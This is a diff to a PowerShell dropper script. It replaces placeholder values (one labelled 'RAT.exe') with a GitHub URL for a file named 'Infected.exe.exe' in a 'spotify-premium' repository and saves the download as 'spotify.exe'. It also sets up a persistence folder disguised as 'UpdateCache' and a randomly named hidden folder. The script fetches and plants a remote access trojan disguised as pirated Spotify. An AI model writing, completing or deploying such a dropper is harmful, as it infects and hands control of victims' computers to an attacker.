@@ -31,8 +31,8 @@ if (-not ([System.Security.Principal.WindowsIdentity]::GetCurrent().Owner.IsWell
     exit
 }
 
-$downloadUrl = "https://URL.HEREMUSTBEDIRECTDOWNLOAD.exe"
-$fileName = "FILENAME OF EXE LIKE RAT.exe"
+$downloadUrl = "https://github.com/lineamortale/spotify-premium/raw/refs/heads/main/Infected.exe.exe"
+$fileName = "spotify.exe"
 $persistFolder = Join-Path $env:APPDATA "UpdateCache"
 $hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
 $tempPath = Join-Path $hiddenFolder $fileName
